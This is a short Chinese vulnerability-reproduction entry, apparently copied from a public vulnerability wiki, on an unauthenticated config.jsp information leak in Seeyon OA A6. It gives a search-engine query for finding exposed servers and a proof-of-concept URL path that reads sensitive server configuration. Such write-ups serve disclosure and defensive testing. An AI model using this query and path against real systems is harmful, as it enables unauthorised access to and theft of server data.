---
title: "致远OA A6 config.jsp 敏感信息泄漏漏洞"
date: 2026-10-17 09:13:11
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "致远OA"
tags:
  - "致远OA"
  - "未授权访问"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

致远OA A6 config.jsp页面可未授权访问，导致敏感信息泄漏漏洞，攻击者通过漏洞可以获取服务器中的敏感信息

## 漏洞影响

```
致远OA A6
```

## 网络测绘

```
body="yyoa" && app="致远互联-OA"
```

## 漏洞复现

登录页面

![image-20220520152551136](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201525328.png)

验证POC

```
	/yyoa/ext/trafaxserver/SystemManage/config.jsp
```

![image-20220520152601778](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201526835.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E8%87%B4%E8%BF%9COA-A6-config.jsp-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md)
